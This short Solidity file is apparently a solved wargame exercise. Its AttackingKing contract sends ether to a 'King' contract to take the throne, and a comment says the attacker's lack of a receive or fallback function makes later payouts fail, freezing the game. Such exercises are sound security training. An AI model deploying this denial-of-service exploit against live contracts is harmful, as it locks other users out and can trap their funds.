// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./King.sol";
import "hardhat/console.sol";

contract AttackingKing {
    address public contractAddress;
    King public king;

    constructor(address _contractAddress) payable {
        contractAddress = _contractAddress;
        king = King(payable(contractAddress));
    }

    function hackContract() external {
        // Code me!
        
       contractAddress.call{value: 2 ether}("");
       console.log(king._king());
       console.log(king._prize());
    }

    // by not having a fallback or receive function, the King contract cannot send to us!
    // so it fails but we have still changed the king and prize :D 
}
